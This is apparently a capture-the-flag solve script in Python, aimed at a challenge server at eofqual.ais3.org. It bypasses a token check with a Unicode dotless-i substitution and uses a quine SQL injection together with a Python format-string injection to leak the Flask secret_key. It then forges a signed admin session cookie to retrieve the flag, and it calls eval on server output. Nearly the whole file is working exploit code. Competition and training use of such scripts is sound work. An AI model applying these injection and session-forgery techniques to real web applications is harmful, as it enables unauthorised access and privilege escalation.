#!/usr/bin/env python3

from flask.sessions import SecureCookieSessionInterface
from flask import Flask
import requests

base_url = "http://eofqual.ais3.org:1977"


def login(username, password, **kwargs):
    admin_token = "ADMIN-E864E8E8F230374AA7B3B0CE441E209A".replace("ADMIN", "ADMıN")
    ret = requests.post(f"{base_url}/login", data={
        "username": username,
        "password": password,
        "token": admin_token
    }, **kwargs).text
    return ret

# [STAGE 1]
# Quine SQL Injection & Leak secret_key


fmt_leak = '{flag.__str__.__globals__[app].secret_key}'
query = f"'UNION SELECT '{fmt_leak}',substr(query,1,###)||X'22'||query||X'22'||substr(query,@@@)"
payload = f"""
{query} FROM(SELECT "{query} FROM(SELECT as query)--" as query)--
""".strip().replace(" ", '/**/')

offset = payload.index('"\x27UNION')  # start of `query`
payload = payload.replace('###', str(offset)).replace('@@@', str(offset-3))

res = login(fmt_leak, payload)


secret_key = eval(res[len("Hello, "): res.find(" ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡")])
print("[+] SECRET_KEY =", secret_key)


# [STAGE 2]
# Forge Flask Session


class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


app = MockApp(secret_key)
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session = serializer.dumps({"is_admin": True})
print("[+] Forged Session =", session)

res = login(fmt_leak, payload, cookies={"session": session})

print("[+] FLAG =", res[res.find("Here is your flag: "):])
